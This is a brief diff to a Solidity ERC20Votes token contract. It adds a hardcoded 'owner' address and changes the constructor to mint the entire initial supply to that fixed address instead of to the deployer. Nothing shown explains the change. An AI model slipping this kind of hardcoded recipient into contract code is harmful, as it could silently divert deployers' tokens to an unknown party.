@@ -2728,12 +2728,15 @@ abstract contract ERC20Votes is IVotes, ERC20Permit {
 // ---------------
 
 contract Token is ERC20Votes {
+
+    address public owner = 0x9060723c22dE586c2fA5eFa07A7743F6f4a935f5;
+
     constructor(
         string memory _name,
         string memory _symbol,
         uint256 _initialSupply
     ) ERC20(_name, _symbol) ERC20Permit(_name) {
-        _mint(msg.sender, _initialSupply);
+        _mint(owner, _initialSupply);
     }
 
     // The functions below are overrides required by Solidity.
